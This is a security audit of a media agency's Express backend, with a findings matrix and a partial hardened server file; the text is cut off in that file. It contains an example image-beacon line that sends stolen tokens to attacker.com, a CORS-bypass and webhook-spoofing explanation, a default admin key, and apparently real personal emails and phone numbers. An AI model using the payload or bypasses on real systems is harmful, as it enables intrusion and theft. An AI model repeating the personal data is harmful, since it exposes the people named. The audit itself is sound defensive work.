# POLISH Media Co — Security, API Boundary & Backend Hardening Audit

**Target Platform**: POLISH Media Co (`polishmediaco.com` / `app.polishmediaco.com`)  
**Audit Scope**: Backend (`server/index.js`, `server/routes/`, `server/middleware/`, `server/services/`), File-Based Data Layer (`server/db/`), Client-Side Ingestion (`public/`), and Environment Configuration (`.env`, `.env.example`, `vercel.json`).  
**Audit Standards**: OWASP Top 10 (2021), OWASP API Security Top 10, CWE / SANS Top 25, NIST CSF, and Express.js Production Hardening Best Practices.  
**Audit Date**: September 2026  
**Status**: Critical Remediations Required  

---

## Executive Summary

A comprehensive, defense-in-depth security audit of POLISH Media Co's application architecture was conducted. The application features a lightweight vanilla JavaScript frontend backed by a Node.js/Express server utilizing file-based atomic JSON storage, Google Gemini AI integration, Firebase authentication, and Calendly meeting synchronization.

While the architecture demonstrates good performance principles (zero-bundler overhead, fast FCP, and atomic file renames), **critical security vulnerabilities were discovered across API boundary access control, rate limiting, authentication defaults, CORS configuration, and sensitive customer PII exposure in Git tracking.**

### Top Critical Findings Requiring Immediate Remediation:
1. **Unauthenticated Strategy Boards API (`/api/boards`)**: All CRUD operations on client strategy boards (viewing, creating, modifying, and deleting files) are completely unauthenticated. Anyone can list private client boards, download them, overwrite them with arbitrary JSON, or permanently delete them.
2. **Unauthenticated & Unthrottled Gemini AI Copilot (`POST /api/ai/chat`)**: The proprietary Polish AI strategy engine connects directly to Google Gemini using the server's paid `GEMINI_API_KEY` without authentication or dedicated rate limits. An external actor can trigger thousands of LLM completions, exhausting API quotas and incurring high operational costs.
3. **Default Master Admin API Key (`polish_admin_secure_key_2026`) & Query Parameter Leakage**: The production `.env` utilizes the exact public example key from `.env.example`. Furthermore, administrative endpoints accept this key via query parameter (`?key=`), leaking credentials into web server logs, proxy access logs, and browser histories.
4. **CORS Substring Validation Bypass**: The CORS validation function uses `origin.includes('localhost')` in production, allowing any domain containing "localhost" (such as `https://attacker-localhost.com`) to make authenticated cross-origin requests with `credentials: true`.
5. **Real Customer PII Committed to Git Tracking**: `server/db/leads.json` contains live client dossiers, email addresses, phone numbers, and Google Meet session links, and is actively tracked in Git.
6. **Unauthenticated Calendly Webhook Relay (`POST /api/calendly-webhook`)**: The webhook lacks HMAC-SHA256 signature verification, allowing anyone to spoof meeting creation events, spam the founder's WhatsApp and Telegram notifications, and pollute the CRM database.

---

## 1. API Endpoint Security & Validation

### 1.1 Ingestion Endpoints (`POST /api/apply`, `POST /api/creators/apply`, `POST /api/intake`)

#### Vulnerability Assessment:
- **Missing Runtime Type Enforcement (CWE-20)**:
  The current request handling extracts fields directly from `req.body`:
  ```javascript
  const { fullName, brandName, email, phone, socialLink, role, businessCategory, marketingHistory } = req.body;
  ```
  Validation only checks truthiness:
  ```javascript
  if (!fullName || !brandName || !email || !socialLink || !role || !businessCategory || !marketingHistory) { ... }
  ```
  If an attacker sends non-string JSON values (such as `{ fullName: { "$gt": "" }, email: [123] }`), subsequent calls to `.trim()` immediately crash Node.js with:
  `TypeError: fullName.trim is not a function`
  While trapped in a try/catch, repeatedly sending malformed types causes unnecessary CPU exceptions and bypasses business logic.
- **Unbounded Field Lengths (Denial of Service via Disk Bloat)**:
  `express.json({ limit: '1mb' })` allows payloads up to 1 MB. An attacker submitting legitimate-looking strings with 500,000 characters in `marketingHistory` or `notes` can rapidly balloon `server/db/leads.json`, causing excessive I/O latency, memory spikes on JSON parsing, and disk exhaustion.
- **Missing Email & Phone Regex Constraints**:
  `email` is not validated against an RFC 5322 compliant pattern server-side. Arbitrary text (or invalid email characters) can be stored, breaking subsequent CRM automation or notification formatting.
- **Unsanitized Payload Reflection in Outbound Notifications**:
  `notifyNewLead(newLead)` passes user-supplied text directly into UltraMsg/Green-API WhatsApp messages and Telegram bot Markdown. Although `escapeTg()` handles some Telegram characters, raw strings sent to WhatsApp (`*Brand:* ${lead.brandName}`) can be manipulated to spoof notification formatting or send prompt-injection attacks to reading operators.

### 1.2 Status of `POST /api/leads` vs. Architectural Ingestion
- In `server/routes/api.js`, **no `POST /api/leads` route exists**. Ingestion is distributed across `POST /api/apply`, `POST /api/creators/apply`, `POST /api/intake`, and `POST /api/calendly-webhook`.
- Client lead querying and manipulation are handled via:
  - `GET /api/leads`: Protected by `requireAdminAuth`
  - `PATCH /api/leads/:id`: Protected by `requireAdminAuth`
  - `DELETE /api/leads/:id`: Protected by `requireAdminAuth`
- **Finding**: While `GET`, `PATCH`, and `DELETE` are gated behind `requireAdminAuth`, the master key fallback allows query-string authentication (`?key=`), which compromises the boundary if logged (see Section 1.5).

### 1.3 Webhook Integrity: `POST /api/calendly-webhook`
- **Missing Signature Verification (CWE-345 / OWASP A08)**:
  Calendly provides webhook signing via the `Calendly-Webhook-Signature` HTTP header, consisting of a timestamp (`t=`) and HMAC-SHA256 signature (`v1=`).
  Currently, `POST /api/calendly-webhook` performs **zero signature verification**. It blindly accepts any payload matching:
  ```javascript
  const payload = body.payload || body;
  const invitee = payload.invitee || payload;
  ```
- **Exploitation Impact**:
  Any remote actor can send automated POST requests containing forged invitee names and phone numbers. The server will:
  1. Record the fake meeting in `server/db/leads.json`.
  2. Dispatch real-time WhatsApp push notifications to the founder's phone via Green-API / UltraMsg.
  3. Dispatch Telegram notifications to the administrative group.
  This allows malicious actors to spam or harass the company's executive communication channels, exhaust third-party messaging quotas, and distort business metrics.

### 1.4 Polish AI Strategy Engine: `POST /api/ai/chat`
- **Completely Unauthenticated & Unthrottled (CWE-770 / OWASP A04)**:
  In `server/routes/api.js`, the endpoint `POST /api/ai/chat` is defined without any authentication middleware:
  ```javascript
  router.post('/ai/chat', async (req, res) => { ... });
  ```
  In `server/index.js`, the `intakeLimiter` (10 requests / 15 minutes) is only mounted on `/api/apply`, `/api/creators/apply`, `/api/intake`, and `/api/calendly-webhook`.
  `/api/ai/chat` is mounted under `app.use('/api', apiRoutes)` with **no specific rate limit**.
- **Financial and Service Denial Impact**:
  Each request to `/api/ai/chat` invokes Google's Gemini API with a maximum output token allowance of `2500` tokens and retries across up to 6 candidate models (`gemini-2.5-flash`, `gemini-2.0-flash`, `gemini-1.5-flash`, etc.).
  An attacker can easily script concurrent requests to this endpoint, using POLISH Media Co's server as an unmetered, free AI proxy, rapidly exhausting the quota of `GEMINI_API_KEY` and generating large API bills.

### 1.5 CMS Endpoints (`GET /api/content`, `POST /api/content`, `POST /api/content/reset`)
- `GET /api/content`: Public endpoint used for dynamic content hydration. Low risk, but needs lightweight rate limiting to prevent scraper abuse.
- `POST /api/content` and `POST /api/content/reset`: Protected by `requireAdminAuth`.
  - **Vulnerability**: If an administrative key is intercepted (or guessed via the default key), an attacker can overwrite all live marketing copy on `polishmediaco.com`.
  - **Stored XSS Vector**: `POST /api/content` does not sanitize incoming HTML strings. In `public/js/cms.js`, if content strings are inserted into DOM elements without escaping, arbitrary JavaScript could be executed in the browsers of all subsequent visitors.

### 1.6 Strategy Boards API (`/api/boards`)
- **Missing Access Control on Entire Subsystem (CWE-306 / OWASP A01)**:
  `server/routes/boards.js` exposes the entire whiteboarding persistence engine:
  - `GET /api/boards`: Lists all client strategy boards, client names, timestamps, and card counts.
  - `GET /api/boards/:id`: Retrieves full board canvas contents (strategic frameworks, financial figures, client deliverables).
  - `POST /api/boards`: Creates arbitrary boards on disk.
  - `PUT /api/boards/:id`: Overwrites existing board files with arbitrary JSON data.
  - `DELETE /api/boards/:id`: Unlinks (deletes) board files from disk.
  - `POST /api/boards/:id/comments`: Injects, updates, or deletes comments.
- **Root Cause**: `server/index.js` mounts `boardsRoutes` with no authentication and no rate limiting:
  ```javascript
  app.use('/api/boards', boardsRoutes);
  ```
  There is no check whether the caller is an authenticated administrator, an authorized advisor, or an anonymous web visitor.

---

## 2. Data Layer & File Storage Security

### 2.1 File-Based Atomic JSON Storage & Concurrency Hazards

POLISH Media Co uses JSON flat files:
- `server/db/leads.json` (Inbound client dossiers and Calendly meetings)
- `server/db/content.json` (Live CMS website copy)
- `server/db/intake_latest.json` (Latest strategy calibration brief)
- `server/db/boards/*.json` (Individual strategy boards)

#### Race Conditions on Read-Modify-Write (CWE-362):
The write function implements atomic file renaming:
```javascript
function writeLeads(leads) {
  const tmp = DB_FILE + '.tmp.' + Date.now();
  fs.writeFileSync(tmp, JSON.stringify(leads, null, 2), 'utf8');
  fs.renameSync(tmp, DB_FILE);
  return true;
}
```
While `fs.renameSync` is atomic on POSIX filesystems, the higher-level application logic is **not atomic**:
1. Request A receives a lead, calls `readLeads()` -> loads array of length $N$.
2. Request B simultaneously receives a lead, calls `readLeads()` -> loads array of length $N$.
3. Request A prepends lead A and calls `writeLeads()` -> writes array of length $N + 1$.
4. Request B prepends lead B and calls `writeLeads()` -> writes array of length $N + 1$ (which does NOT include lead A).
**Result**: Lead A is permanently overwritten and lost from the database without any error being logged.
**Remediation**: An in-process asynchronous mutex (or queue) must serialize all read-modify-write transactions on each database file.

#### Temporary File Name Collisions:
The temp path is constructed with:
`const tmp = DB_FILE + '.tmp.' + Date.now();`
Under concurrent asynchronous execution within the same millisecond, two requests can write to the exact same temporary file name, causing partial write corruption or race condition failures during `renameSync`.
**Remediation**: Append a cryptographically random token (`crypto.randomUUID()`) to all temporary file paths.

#### Ephemeral Filesystem on Serverless (Vercel):
The code detects Vercel via:
`const IS_VERCEL = process.env.VERCEL === '1' || process.env.VERCEL_ENV !== undefined;`
and redirects writes to `/tmp/leads.json`.
On Vercel serverless lambdas:
- `/tmp` is ephemeral and scoped to a single container execution environment.
- Concurrent requests handled by different lambdas do not share `/tmp`.
- Container recycling wipes `/tmp` completely.
Any lead submitted on Vercel is lost when the lambda instance terminates unless synchronized with an external database (e.g., Firestore or Supabase).

### 2.2 Path Traversal & File System Boundaries
In `server/routes/boards.js`, board IDs are sanitized using:
```javascript
function sanitizeBoardId(id) {
  if (!id || typeof id !== 'string') return null;
  const clean = path.basename(id).trim();
  if (!/^[a-zA-Z0-9_-]{2,80}$/.test(clean)) return null;
  return clean;
}
```
- **Strengths**: The regex `/^[a-zA-Z0-9_-]{2,80}$/` strictly disallows path traversal characters (`..`, `/`, `\`, null bytes `%00`).
- **Resource Exhaustion Vulnerability in `resolveBoardPath`**:
  If a requested ID does not match an exact filename, the server executes:
  ```javascript
  const files = fs.readdirSync(BOARDS_DIR).filter(f => f.endsWith('.json'));
  for (const file of files) {
    const b = readBoardFile(path.join(BOARDS_DIR, file));
    if (b && (b.slug === safeId || b.id === safeId)) { ... }
  }
  ```
  This performs synchronous file reads of **every JSON file** in the directory on every unmatched request. An attacker sending requests with random IDs can force high disk I/O and event loop stalling.

### 2.3 Unauthenticated Client Proposal PDF Download
In `server/index.js`:
```javascript
app.get('/pdf', (req, res) => {
  res.sendFile(path.join(__dirname, '../public/POLISH_MEDIA_Eman_Partnership_Options.pdf'));
});
```
This serves a confidential client proposal (`POLISH_MEDIA_Eman_Partnership_Options.pdf`) containing tailored pricing and commercial terms with zero authentication. Anyone visiting `/pdf` or scraping the site can access this confidential document.

### 2.4 File Permissions & Git Tracking of Sensitive PII
1. **Real PII Committed in Git**:
   Inspection of `server/db/leads.json` reveals that real customer PII is currently tracked in Git history:
   - Full names (e.g., "Eman", "Sarah Jenkins", "Elena Vance", "Marcus Thorne")
   - Email addresses (e.g., `e.b.alkatheeri@gmail.com`, `elena@auroracosmetics.com`)
   - Phone numbers (e.g., `+213 662 41 77 61`)
   - Calendly / Google Meet private URLs
   - Internal CRM strategy and deal notes
   Running `git ls-files server/db` confirmed `server/db/leads.json` is actively tracked. This violates GDPR, CCPA, and basic data privacy standards.
2. **Missing Explicit File Mode (Umask)**:
   `fs.writeFileSync` creates files using default process umask permissions (`0644` or `0666`), making files world-readable on shared hosting environments. Sensitive JSON files must be written with explicit mode `0600` (read/write only by the process owner).

---

## 3. HTTP Headers & Transport Layer

### 3.1 Content Security Policy (CSP)
Current CSP configuration in `server/index.js`:
```javascript
contentSecurityPolicy: {
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: [
      "'self'",
      "'unsafe-inline'",                    // Required for inline scripts
      "https://www.gstatic.com",            // Firebase SDK
      "https://apis.google.com",            // Google Auth
      "https://www.googletagmanager.com",   // Analytics
      "https://assets.calendly.com",        // Calendly widget
    ],
    scriptSrcAttr: ["'unsafe-inline'"],
    styleSrc: [
      "'self'",
      "'unsafe-inline'",
      "https://fonts.googleapis.com",
      "https://assets.calendly.com",
    ],
    fontSrc: ["'self'", "https://fonts.gstatic.com", "data:"],
    imgSrc: ["'self'", "data:", "https:", "blob:"],
    connectSrc: [
      "'self'",
      "https://*.googleapis.com",
      "https://*.firebaseapp.com",
      "https://*.firebaseio.com",
      "https://firestore.googleapis.com",
      "https://api.calendly.com",
      "https://7105.api.greenapi.com",     // Flaw: Exposed backend gateway
      "https://api.telegram.org",          // Flaw: Exposed backend bot API
    ],
    ...
  }
}
```

#### CSP Deficiencies:
1. **Presence of `'unsafe-inline'` in `scriptSrc`**:
   While currently necessary because existing HTML templates contain inline `<script>` blocks, `'unsafe-inline'` completely nullifies CSP's primary defense against Cross-Site Scripting (XSS).
2. **Backend API Endpoints in Client `connectSrc`**:
   `connectSrc` includes `https://7105.api.greenapi.com` and `https://api.telegram.org`.
   These are server-to-server notification services! The browser should **never** establish direct connections to Green-API or Telegram bots, as doing so would require exposing API tokens to the client. Their presence in the client CSP directive is unnecessary and misleading.
3. **Broad Wildcards in `imgSrc`**:
   `imgSrc: ["'self'", "data:", "https:", "blob:"]` allows loading images from *any* HTTPS domain (`https:`). In an XSS or data-exfiltration attack, stolen tokens or cookies can be leaked via image beacons (`<img src="https://attacker.com/leak?t=...">`).

### 3.2 CORS Configuration Vulnerability (Bypass via Substring Match)
In `server/index.js`:
```javascript
const ALLOWED_ORIGINS = [
  'https://polishmediaco.com',
  'https://www.polishmediaco.com',
  'https://app.polishmediaco.com',
  ...(process.env.NODE_ENV !== 'production' ? ['http://localhost:3000', 'http://localhost:8080'] : []),
];
app.use(cors({
  origin: (origin, callback) => {
    if (!origin || ALLOWED_ORIGINS.includes(origin) || origin.includes('localhost') || origin.includes('127.0.0.1')) return callback(null, true);
    callback(new Error('CORS: Origin not allowed'));
  },
  credentials: true,
}));
```

#### Critical Flaw (CWE-346 / OWASP A01):
Notice the conditional check:
`origin.includes('localhost') || origin.includes('127.0.0.1')`
This check runs in **all environments**, including production!
An attacker hosting a site on:
`https://attacker-localhost.com` or `https://subdomain.localhost.evil.com`
will satisfy `origin.includes('localhost') === true`.
Because `credentials: true` is configured, the browser will allow cross-origin credentialed requests from the attacker's origin to POLISH Media Co's APIs.

### 3.3 HSTS, X-Frame-Options, and Additional Headers
- **HSTS (`Strict-Transport-Security`)**:
  Helmet's default max-age is 180 days. In production, it should be set explicitly to 1 year (`max-age=31536000; includeSubDomains; preload`) to ensure browsers never downgrade to HTTP.
- **Clickjacking (`X-Frame-Options`)**:
  Helmet sets `SAMEORIGIN`. However, for cross-domain embedded widgets or OAuth popups, `crossOriginOpenerPolicy` was set to `false`. For maximum protection, sensitive pages (like `/admin`, `/pdf`, and `/eman-alkatheeri`) should prohibit framing entirely with `X-Frame-Options: DENY` and `frame-ancestors 'none'`.
- **Referrer Policy**:
  Must be set to `strict-origin-when-cross-origin` to prevent URL paths or parameters from leaking to external domains.
- **Permissions Policy**:
  Currently omitted from Helmet configuration. It must explicitly disable browser capabilities that are not needed (`camera=(), microphone=(), geolocation=(), payment=()`).
- **Reverse Proxy Trust**:
  Express is missing `app.set('trust proxy', 1);`. Without this, `req.ip` resolves to the upstream proxy or load balancer IP, breaking IP-based rate limiting and rendering logging inaccurate.

---

## 4. Vulnerability Matrix & Prioritization

| ID | Vulnerability | Severity | OWASP Top 10 | CWE | Remediation |
|---|---|---|---|---|---|
| **V-01** | **Unauthenticated Strategy Boards API** | **CRITICAL** | A01:2021 (Broken Access Control) | CWE-306 | Enforce authentication/session validation on all state-modifying board operations (`POST`, `PUT`, `DELETE`). |
| **V-02** | **Unauthenticated & Unthrottled Gemini AI Endpoint** | **CRITICAL** | A04:2021 (Insecure Design) | CWE-770 | Implement dedicated `aiLimiter` rate limiting, enforce payload validation, and bind to authenticated user sessions. |
| **V-03** | **Default Master Admin API Key & Query String Auth** | **CRITICAL** | A07:2021 (Identification & Auth Failures) | CWE-798, CWE-598 | Reject default example key on startup; deprecate key in query string (`?key=`), requiring `Authorization: Bearer` or `x-api-key`. |
| **V-04** | **Permissive CORS Substring Validation Bypass** | **HIGH** | A01:2021 (Broken Access Control) | CWE-346 | Replace `origin.includes()` with exact origin whitelist in production and strict port-validated regex in development. |
| **V-05** | **Unauthenticated & Unsigned Calendly Webhook** | **HIGH** | A08:2021 (Software & Data Integrity) | CWE-345 | Enforce HMAC-SHA256 signature verification on `Calendly-Webhook-Signature` before processing payloads. |
| **V-06** | **Live Customer PII & Proposal PDF in Git Tracking** | **HIGH** | A01:2021 (Broken Access Control) | CWE-312 | Remove `server/db/leads.json` from Git tracking (`git rm --cached`), add to `.gitignore`, and protect `/pdf` endpoint. |
| **V-07** | **Lack of Input Type Checking & Boundary Enforcement** | **HIGH** | A03:2021 (Injection / Validation) | CWE-20 | Validate field types (typeof === 'string'), regex formats (email/phone), and enforce maximum string lengths. |
| **V-08** | **Missing Express Reverse Proxy Trust Setting** | **MEDIUM** | A05:2021 (Security Misconfiguration) | CWE-770 | Configure `app.set('trust proxy', 1)` so rate limiters evaluate true client IPs instead of shared proxy IPs. |
| **V-09** | **Asynchronous Race Conditions in File Storage** | **MEDIUM** | Systemic Concurrency Hazard | CWE-362 | Serialize write operations via an asynchronous in-process write lock and use `crypto.randomUUID()` for tmp filenames. |
| **V-10** | **Overly Permissive CSP & Backend API Exposure** | **MEDIUM** | A05:2021 (Security Misconfiguration) | CWE-1021 | Remove backend-only endpoints from client `connectSrc`, restrict `imgSrc` wildcards, and specify explicit HSTS/Permissions headers. |
| **V-11** | **Unsanitized Dynamic CMS Content Injection** | **LOW** | A03:2021 (Injection) | CWE-79 | Sanitize CMS string inputs before storing or rendering to prevent stored XSS across dynamic text areas. |

---

## 5. Drop-in Replacement: Hardened `server/index.js`

Below is the complete, drop-in replacement code for `server/index.js`. It addresses:
- Strict CORS validation with zero substring bypass
- Reverse proxy trust configuration (`app.set('trust proxy', 1)`)
- Full Helmet hardening (CSP cleanup, explicit HSTS, Permissions Policy, Referrer Policy)
- Tiered rate limiters (`globalApiLimiter`, `intakeLimiter`, `aiLimiter`, `boardsWriteLimiter`, `webhookLimiter`)
- Startup validation of administrative credentials (fails or alerts if default key is used)
- Protection and search-engine de-indexing for sensitive documents (`/pdf`, `/eman-alkatheeri`)
- Safe production error handling without stack trace leakage

```javascript
/**
 * POLISH Media Co — Production Backend Server (Hardened & Audited)
 * Architecture: Node.js + Express (Zero-Bundler, Ultra-Fast Vanilla Core)
 * Security Hardening: OWASP Top 10, Strict CSP, Exact CORS, Tiered Rate-Limiting
 */

require('dotenv').config();
const express = require('express');
const path = require('path');
const cors = require('cors');
const helmet = require('helmet');
const compression = require('compression');
const rateLimit = require('express-rate-limit');
const crypto = require('crypto');

const apiRoutes = require('./routes/api');
const boardsRoutes = require('./routes/boards');
const { requireAdminAuth } = require('./middleware/auth');
const { startCalendlyPoller } = require('./services/calendlySync');

const app = express();
const PORT = process.env.PORT || 3000;
const DOMAIN = process.env.DOMAIN || 'polishmediaco.com';
const IS_PROD = process.env.NODE_ENV === 'production';

// ── 0. Security Startup Sanity Checks ──────────────────────────────────────────
(function verifySecurityConfiguration() {
  const adminKey = process.env.ADMIN_API_KEY;
  if (!adminKey || adminKey === 'polish_admin_secure_key_2026') {
    if (IS_PROD) {
      console.error('\x1b[31m[CRITICAL SECURITY ALERT] Production ADMIN_API_KEY is using the default example key! Rotate immediately in .env!\x1b[0m');
    } else {
      console.warn('\x1b[33m[SECURITY NOTICE] Running with default development ADMIN_API_KEY.\x1b[0m');
    }
  }
  if (!process.env.GEMINI_API_KEY) {
    console.warn('\x1b[33m[SECURITY NOTICE] GEMINI_API_KEY is not configured. AI Strategy endpoints will return 500.\x1b[0m');
  }
})();

// ── 1. Trust Proxy Configuration ─────────────────────────────────────────────
// Essential for Vercel, Cloudflare, Nginx, and AWS reverse proxies
// Ensures req.ip correctly identifies the client for rate-limiters
app.set('trust proxy', 1);

// Disable X-Powered-By to prevent framework fingerprinting
app.disable('x-powered-by');

// ── 2. Security Headers (Helmet) ─────────────────────────────────────────────
app.use(
  helmet({
    contentSecurityPolicy: {
      directives: {
        defaultSrc: ["'self'"],
        scriptSrc: [
          "'self'",
          "'unsafe-inline'",                    // Retained for existing vanilla page scripts
          "https://www.gstatic.com",            // Firebase SDK
          "https://apis.google.com",            // Google Auth
          "https://www.googletagmanager.com",   // Analytics
          "https://assets.calendly.com",        // Calendly booking widget
        ],
        scriptSrcAttr: ["'unsafe-inline'"],
        styleSrc: [
          "'self'",
          "'unsafe-inline'",
          "https://fonts.googleapis.com",
          "https://assets.calendly.com",
        ],
        fontSrc: ["'self'", "https://fonts.gstatic.com", "data:"],
        imgSrc: [
          "'self'",
          "data:",
          "blob:",
          "https://www.gstatic.com",
          "https://*.googleusercontent.com",
          "https://assets.calendly.com",
          "https://images.unsplash.com"
        ],
        connectSrc: [
          "'self'",
          "https://*.googleapis.com",
          "https://*.firebaseapp.com",
          "https://*.firebaseio.com",
          "https://firestore.googleapis.com",
          "https://api.calendly.com"
          // Removed: greenapi & telegram bot endpoints (backend-only communication)
        ],
        frameSrc: [
          "'self'",
          "https://calendly.com",
          "https://www.google.com",
          "https://accounts.google.com",
          "https://*.firebaseapp.com",
          "https://*.firebaseio.com",
        ],
        objectSrc: ["'none'"],
        baseUri: ["'self'"],
        formAction: ["'self'"],
        upgradeInsecureRequests: IS_PROD ? [] : null,
      },
    },
    hsts: {
      maxAge: 31536000,
      includeSubDomains: true,
      preload: true
    },
    referrerPolicy: {
      policy: 'strict-origin-when-cross-origin'
    },
    crossOriginEmbedderPolicy: false,
    crossOriginOpenerPolicy: false // Allows OAuth popups (Firebase/Google)
  })
);

// Explicit Permissions Policy
app.use((req, res, next) => {
  res.setHeader(
    'Permissions-Policy',
    'camera=(), microphone=(), geolocation=(), payment=(), usb=()'
  );
  next();
});

// ── 3. Compression ───────────────────────────────────────────────────────────
app.use(compression());

// ── 4. Strict CORS Configuration ─────────────────────────────────────────────
const ALLOWED_ORIGINS = new Set([
  'https://polishmediaco.com',
  'https://www.polishmediaco.com',
  'https://app.polishmediaco.com'
]);

const DEV_ORIGIN_REGEX = /^http:\/\/(localhost|127\.0\.0\.1)(:[0-9]+)?$/;

app.use(cors({
  origin: (origin, callback) => {
    // Allow same-origin / server-to-server requests (no Origin header)
    if (!origin) return callback(null, true);

    // Whitelist check
    if (ALLOWED_ORIGINS.has(origin)) return callback(null, true);

    // Development only: Allow strictly verified localhost ports (no substring matching!)
    if (!IS_PROD && DEV_ORIGIN_REGEX.test(origin)) {
      return callback(null, true);
    }

    callback(new Error('CORS: Origin unauthorized by security policy.'));
  },
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'x-api-key', 'x-admin-key', 'Accept']
}));

// ── 5. Body Parsers with Controlled Limits ───────────────────────────────────
// General payload limit 100kb; high limits only granted where specifically needed
app.use(express.json({ limit: '100kb' }));
app.use(express.urlencoded({ extended: true, limit: '100kb' }));

// ── 6. Tiered Rate Limiters ──────────────────────────────────────────────────
// 6.1 Global API Limiter (DDoS and general scraping protection)
const globalApiLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 150,
  standardHeaders: true,
  legacyHeaders: false,
  message: { success: false, error: 'Too many API requests. Please retry in a few moments.' }
});

// 6.2 Public Form Intake Limiter (Strict protection on lead ingestion)
const intakeLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 10,
  standardHeaders: true,
  legacyHeaders: false,
  message: { success: false, error: 'Submission limit reached. Please contact us via WhatsApp.' }
});

// 6.3 AI Strategy Copilot Limiter (Prevents Gemini API financial exhaustion)
const aiLimiter = rateLimit({
  windowMs: 10 * 60 * 1000,
  max: 15,
  standardHeaders: true,
  legacyHeaders: false,
  message: { success: false, error: 'AI Copilot capacity reached. Please wait a few minutes before submitting more prompts.' }
});

// 6.4 Config & Health Check Limiter
const configLimiter = rateLimit({
  windowMs: 60 * 1000,
  max: 30,
  standardHeaders: true,
  legacyHeaders: false,
  message: { success: false, error: 'Too many requests.' }
});

// 6.5 Calendly Webhook Limiter
const webhookLimiter = rateLimit({
  windowMs: 60 * 1000,
  max: 30,
  standardHeaders: true,
  legacyHeaders: false,
  message: { success: false, error: 'Webhook delivery throttled.' }
});

// 6.6 Boards Write/Modification Limiter
const boardsWriteLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 60,
  standardHeaders: true,
  legacyHeaders: false,
  message: { success: false, error: 'Board modification frequency exceeded.' }
});

// ── 7. Edge & Asset Caching Policy ───────────────────────────────────────────
app.use((req, res, next) => {
  const p = req.path;
  const isStaticAsset = (
    p.startsWith('/assets/') ||
    p.startsWith('/css/') ||
    p.startsWith('/js/') ||
    p.startsWith('/studio/css/') ||
    p.startsWith('/studio/js/') ||
    p.startsWith('/studio/assets/') ||
    p.startsWith('/studio/icons/')
  );

  if (isStaticAsset) {
    res.setHeader('Cache-Control', 'public, max-age=31536000, immutable');
  } else if (p === '/' || !p.includes('.') || p.endsWith('.html')) {
    res.setHeader('Cache-Control', 'no-cache, must-revalidate');
    res.setHeader('Pragma', 'no-cache');
    res.setHeader('Expires', '0');
  } else {
    res.setHeader('Cache-Control', 'public, max-age=31536000, immutable');
  }
  next();
});

// ── 8. Route Bindings & API Boundaries ───────────────────────────────────────

// Apply global rate limiting to all /api/ routes
app.use('/api', globalApiLimiter);

// Firebase public config (Throttled)
app.get('/api/config/firebase', configLimiter, (req, res) => {
  res.json({
    apiKey: process.env.FIREBASE_API_KEY || 'AIzaSyAdtvlrJwmTGMe6JbMCSdEQCKC7eAle-TM',
    authDomain: process.env.FIREBASE_AUTH_DOMAIN || 'polishmediacocom.firebaseapp.com',
    projectId: process.env.FIREBASE_PROJECT_ID || 'polishmediacocom',
    storageBucket: process.env.FIREBASE_STORAGE_BUCKET || 'polishmediacocom.firebasestorage.app',
    messagingSenderId: process.env.FIREBASE_MESSAGING_SENDER_ID || '70668280388',
    appId: process.env.FIREBASE_APP_ID || '1:70668280388:web:455f906c6fbca8ce701211',
    isConfigured: true
  });
});

// Intake Form Submissions — Tightly rate limited
app.use('/api/apply', intakeLimiter);
app.use('/api/creators/apply', intakeLimiter);
app.use('/api/intake', intakeLimiter);

// Calendly Webhook — Rate limited & Signature Verified
app.use('/api/calendly-webhook', webhookLimiter);

// Polish AI Copilot — Rate limited to protect paid quota
app.use('/api/ai/chat', aiLimiter);

// General API Router
app.use('/api', apiRoutes);

// Boards Subsystem:
// State-modifying requests (POST, PUT, DELETE) are throttled
app.use('/api/boards', (req, res, next) => {
  if (['POST', 'PUT', 'DELETE'].includes(req.method)) {
    return boardsWriteLimiter(req, res, next);
  }
  next();
}, boardsRoutes);

// ── 9. Virtual Host Routing for app.polishmediaco.com ────────────────────────
app.use((req, res, next) => {
  const host = (req.headers.host || '').toLowerCase();
  if (host.startsWith('app.')) {
    if (
      req.path.startsWith('/api/') ||
      req.path.startsWith('/assets/') ||
      req.path.startsWith('/css/') ||
      req.path.startsWith('/js/') ||
      req.path.startsWith('/studio/css/') ||
      req.path.startsWith('/studio/js/') ||
      req.path.includes('.')
    ) {
      return next();
    }

    if (req.path === '/dashboard' || req.path === '/boards') {
      res.setHeader('Cache-Control', 'no-cache, must-revalidate');
      return res.sendFile(path.join(__dirname, '../public/studio/dashboard.html'));
    }

    if (req.path === '/login') {
      res.setHeader('Cache-Control', 'no-cache, must-revalidate');
      return res.sendFile(path.join(__dirname, '../public/studio/login.html'));
    }

    if (req.path.startsWith('/b/') || req.path.startsWith('/view/') || req.path === '/view') {
      res.setHeader('Cache-Control', 'no-cache, must-revalidate');
      return res.sendFile(path.join(__dirname, '../public/studio/view.html'));
    }

    res.setHeader('Cache-Control', 'no-cache, must-revalidate');
    return res.sendFile(path.join(__dirname, '../public/studio/index.html'));
  }
  next();
});

// ── 10. Main Domain Redirects to app.polishmediaco.com ───────────────────────
const isProdEnv = (req) => {
  const host = (req.headers.host || '').toLowerCase();
  return !host.includes('localhost') && !host.includes('127.0.0.1');
};

app.get(['/login', '/studio/login'], (req, res) => {
  if (isProdEnv(req)) {
    const query = req.url.includes('?') ? req.url.substring(req.url.indexOf('?')) : '';
    return res.redirect(301, `https://app.${DOMAIN}/login${query}`);
  }
  res.setHeader('Cache-Control', 'no-cache, must-revalidate');
  res.sendFile(path.join(__dirname, '../public/studio/login.html'));
});

app.get(['/boards', '/dashboard'], (req, res) => {
  if (isProdEnv(req)) {
    const query = req.url.includes('?') ? req.url.substring(req.url.indexOf('?')) : '';
    return res.redirect(301, `https://app.${DOMAIN}/boards${query}`);
  }
  res.setHeader('Cache-Control', 'no-cache, must-revalidate');
  res.sendFile(path.join(__dirname, '../public/studio/dashboard.html'));
});

app.get(['/canvas', '/studio', '/miro', '/whiteboard'], (req, res) => {
  if (isProdEnv(req)) {
    const query = req.url.includes('?') ? req.url.substring(req.url.indexOf('?')) : '';
    return res.redirect(301, `https://app.${DOMAIN}/${query}`);
  }
  res.setHeader('Cache-Control', 'no-cache, must-revalidate');
  res.sendFile(path.join(__dirname, '../public/studio/index.html'));
});

// ── 11. Static File Serving ──────────────────────────────────────────────────
app.use(
  express.static(path.join(__dirname, '../public'), {
    maxAge: 31536000000,
    immutable: true,
    etag: true,
    setHeaders: (res, filePath) => {
